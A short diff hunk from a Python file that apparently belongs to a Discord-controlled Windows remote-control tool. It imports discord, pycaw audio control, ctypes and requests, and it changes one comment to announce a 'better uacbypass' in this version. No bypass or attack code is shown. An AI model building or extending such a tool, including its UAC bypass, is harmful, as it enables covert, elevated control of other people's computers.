@@ -15,7 +15,7 @@ import discord
 from comtypes import CLSCTX_ALL
 from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
 from discord.ext import commands
-###placeholder so if token input fails we dont get fucked up (its hard to explain)
+###placeholder so if token input fails we dont get fucked up (its hard to explain) also i added better uacbypass in this version :p
 from ctypes import *
 from discord import utils
 import requests
